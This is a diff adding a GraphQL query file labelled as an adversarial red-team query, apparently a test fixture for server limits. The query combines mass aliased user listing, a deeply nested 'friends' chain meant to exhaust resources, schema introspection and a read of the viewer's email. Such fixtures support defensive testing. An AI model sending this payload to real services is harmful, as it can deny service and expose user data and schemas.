@@ -1,0 +1,10 @@
+# Baysöz Labs <baysozlabs@proton.me> — adversarial red-team query.
+query HostileQuery {
+  a0: users(first: 1000) { id }
+  a1: users(first: 1000) { id }
+  a2: users(first: 1000) { id }
+  a3: users(first: 1000) { id }
+  friends { friends { friends { friends { friends { friends { friends { friends { friends { id } } } } } } } } }
+  viewer { email }
+  __schema { types { fields { type { fields { name } } } } }
+}
